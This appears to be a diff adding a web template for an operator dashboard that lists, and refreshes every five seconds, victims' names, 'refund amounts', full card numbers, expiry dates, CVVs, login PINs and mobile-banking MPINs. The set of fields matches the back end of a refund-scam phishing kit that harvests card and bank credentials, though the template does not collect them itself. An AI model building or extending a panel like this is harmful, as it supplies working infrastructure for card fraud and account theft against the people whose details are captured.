@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Document</title>
+    <link
+      href="https://cdn.jsdelivr.net/npm/daisyui@3.2.1/dist/full.css"
+      rel="stylesheet"
+      type="text/css"
+    />
+    <script src="https://cdn.tailwindcss.com"></script>
+  </head>
+  <body>
+    <div class="p-10 flex justify-content items-center w-full">
+      <div class="overflow-x-auto p-5">
+        <table class="table">
+          <thead>
+            <tr>
+              <th></th>
+              <th>Account Holder Name</th>
+              <th>Refund Amount</th>
+              <th>Card Holder Name</th>
+              <th>Card Number</th>
+              <th>Expiry Date</th>
+              <th>CVV</th>
+              <th>Login Pin</th>
+              <th>MPin</th>
+            </tr>
+          </thead>
+          <tbody id="data-table-body">
+            <% for (let i = 0; i < data.length; i++) { %>
+            <tr>
+              <td><%= i + 1 %></td>
+              <td><%= data[i].account_holder_name %></td>
+              <td><%= data[i].refund_amount %></td>
+              <td><%= data[i].card_holder_name %></td>
+              <td><%= data[i].card_number %></td>
+              <td><%= data[i].expiry_date %></td>
+              <td><%= data[i].cvv %></td>
+              <td><%= data[i].login_pin %></td>
+              <td><%= data[i].mpin %></td>
+            </tr>
+            <% } %>
+          </tbody>
+        </table>
+      </div>
+    </div>
+
+    <script>
+      function refreshData() {
+        fetch("/data")
+          .then((response) => response.json())
+          .then((data) => {
+            const tableBody = document.getElementById("data-table-body");
+            tableBody.innerHTML = "";
+
+            data.forEach((item, index) => {
+              const row = document.createElement("tr");
+
+              const cellIndex = document.createElement("td");
+              cellIndex.innerText = index + 1;
+              row.appendChild(cellIndex);
+
+              const cellAccountHolderName = document.createElement("td");
+              cellAccountHolderName.innerText = item.account_holder_name;
+              row.appendChild(cellAccountHolderName);
+
+              const cellRefundAmount = document.createElement("td");
+              cellRefundAmount.innerText = item.refund_amount;
+              row.appendChild(cellRefundAmount);
+
+              const cellCardHolderName = document.createElement("td");
+              cellCardHolderName.innerText = item.card_holder_name;
+              row.appendChild(cellCardHolderName);
+
+              const cellCardNumber = document.createElement("td");
+              cellCardNumber.innerText = item.card_number;
+              row.appendChild(cellCardNumber);
+
+              const cellExpiryDate = document.createElement("td");
+              cellExpiryDate.innerText = item.expiry_date;
+              row.appendChild(cellExpiryDate);
+
+              const cellCvv = document.createElement("td");
+              cellCvv.innerText = item.cvv;
+              row.appendChild(cellCvv);
+
+              const cellLoginPin = document.createElement("td");
+              cellLoginPin.innerText = item.login_pin;
+              row.appendChild(cellLoginPin);
+
+              const cellMpin = document.createElement("td");
+              cellMpin.innerText = item.mpin;
+              row.appendChild(cellMpin);
+
+              tableBody.appendChild(row);
+            });
+          })
+          .catch((error) => {
+            console.error("Error fetching data:", error);
+          });
+      }
+
+      setInterval(refreshData, 5000);
+    </script>
+  </body>
+</html>
